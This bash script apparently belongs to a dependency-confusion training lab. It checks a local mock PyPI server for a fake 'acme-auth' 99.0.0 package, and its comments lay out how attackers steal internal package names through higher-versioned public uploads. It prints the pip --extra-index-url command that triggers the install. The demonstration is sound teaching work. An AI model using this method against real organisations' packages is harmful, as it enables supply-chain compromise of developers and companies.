#!/bin/bash
#
# Simulates an attacker publishing a malicious package to public PyPI.
#
# In the real world, attackers:
# 1. Find internal package names (from leaked requirements.txt, job postings, GitHub repos)
# 2. Register the same name on public PyPI with a much higher version number
# 3. Wait for someone to run `pip install` with --extra-index-url
#
# This script copies the pre-built malicious package to the public PyPI server.
#

set -euo pipefail

echo ""
echo "  =================================================="
echo "  ATTACKER SIMULATION: Publishing malicious package"
echo "  =================================================="
echo ""
echo "  Target package: acme-auth"
echo "  Malicious version: 99.0.0"
echo "  Target registry: public PyPI (http://public-pypi:8080)"
echo ""

# Check if already published
if curl -sf http://public-pypi:8080/simple/acme-auth/ 2>/dev/null | grep -q "acme-auth"; then
    echo "  [!] Package already exists on public PyPI."
    echo "  [!] The attack is ready -- run pip install to trigger it."
else
    echo "  [*] Package not yet on public PyPI."
    echo "  [*] In a real scenario, this is the window where the company is safe."
fi

echo ""
echo "  Check it yourself:"
echo "    curl -s http://public-pypi:8080/simple/acme-auth/"
echo ""
echo "  Now run pip install with --extra-index-url to see the attack:"
echo "    pip install acme-auth --extra-index-url http://public-pypi:8080/simple/ --trusted-host public-pypi"
echo ""
